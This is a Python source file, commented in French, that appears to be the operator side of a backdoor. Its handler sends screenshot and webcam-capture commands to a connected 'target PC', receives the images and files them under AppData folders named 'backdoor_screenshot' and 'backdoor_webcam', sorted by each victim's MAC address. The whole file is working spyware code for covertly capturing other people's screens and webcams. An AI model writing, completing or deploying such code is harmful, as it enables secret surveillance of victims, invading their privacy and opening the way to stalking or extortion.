import struct
import os

class ScreenshotHandler:
    def __init__(self, conn_manager):
        self.conn_manager = conn_manager

    def capture(self):
        if not self.conn_manager.conn:
            return "[!] Pas de connexion établie."

        try:
            self.conn_manager.conn.send(b"SCREENSHOT")

            data = self.conn_manager.conn.recv(4)
            if len(data) < 4:
                return "[!] Erreur: Taille du fichier non reçue."

            file_size = struct.unpack("!I", data)[0]
            filename = self.conn_manager.conn.recv(100).decode().strip()
            
            # Extraire l'adresse MAC à partir du nom du fichier
            # Format du nom de fichier: ip_mac_address_timestamp.png
            parts = filename.split('_')
            if len(parts) >= 2:
                mac_address = parts[1]  # L'adresse MAC est la deuxième partie
            else:
                mac_address = "unknown"
            
            # Créer les dossiers dans AppData/Roaming
            appdata_path = os.path.join(os.getenv('APPDATA'), "backdoor_screenshot")
            if not os.path.exists(appdata_path):
                os.makedirs(appdata_path)
                
            pc_folder = os.path.join(appdata_path, mac_address)
            if not os.path.exists(pc_folder):
                os.makedirs(pc_folder)
                
            save_path = os.path.join(pc_folder, filename)

            received_bytes = 0
            with open(save_path, "wb") as file:
                while received_bytes < file_size:
                    chunk = self.conn_manager.conn.recv(min(4096, file_size - received_bytes))
                    if not chunk:
                        break
                    file.write(chunk)
                    received_bytes += len(chunk)

            return f"[+] Screenshot enregistré dans: {save_path}" if received_bytes == file_size else "[!] Erreur: Fichier incomplet reçu."
        except Exception as e:
            return f"[!] Erreur lors de la réception: {str(e)}"
            
    def capture_webcam(self):
        """Capture une image depuis la webcam du PC cible"""
        if not self.conn_manager.conn:
            return "[!] Pas de connexion établie."

        try:
            self.conn_manager.conn.send(b"WEBCAM_SCREENSHOT")

            # Recevoir la réponse - pourrait être une erreur ou des données
            initial_data = self.conn_manager.conn.recv(4)
            
            # Vérifier si c'est un message d'erreur
            if initial_data.startswith(b"[!]"):
                return initial_data.decode()
                
            # Sinon, c'est la taille du fichier
            if len(initial_data) < 4:
                return "[!] Erreur: Taille du fichier non reçue."

            file_size = struct.unpack("!I", initial_data)[0]
            filename = self.conn_manager.conn.recv(100).decode().strip()
            
            # Extraire l'adresse MAC à partir du nom du fichier
            # Format du nom de fichier: webcam_ip_mac_address_timestamp.jpg
            parts = filename.split('_')
            if len(parts) >= 3:
                mac_address = parts[2]  # L'adresse MAC est la troisième partie dans ce cas
            else:
                mac_address = "unknown"
            
            # Créer les dossiers dans AppData/Roaming
            appdata_path = os.path.join(os.getenv('APPDATA'), "backdoor_webcam")
            if not os.path.exists(appdata_path):
                os.makedirs(appdata_path)
                
            pc_folder = os.path.join(appdata_path, mac_address)
            if not os.path.exists(pc_folder):
                os.makedirs(pc_folder)
                
            save_path = os.path.join(pc_folder, filename)

            received_bytes = 0
            with open(save_path, "wb") as file:
                while received_bytes < file_size:
                    chunk = self.conn_manager.conn.recv(min(4096, file_size - received_bytes))
                    if not chunk:
                        break
                    file.write(chunk)
                    received_bytes += len(chunk)

            return f"[+] Image webcam enregistrée dans: {save_path}" if received_bytes == file_size else "[!] Erreur: Fichier incomplet reçu."
        except Exception as e:
            return f"[!] Erreur lors de la réception de la capture webcam: {str(e)}"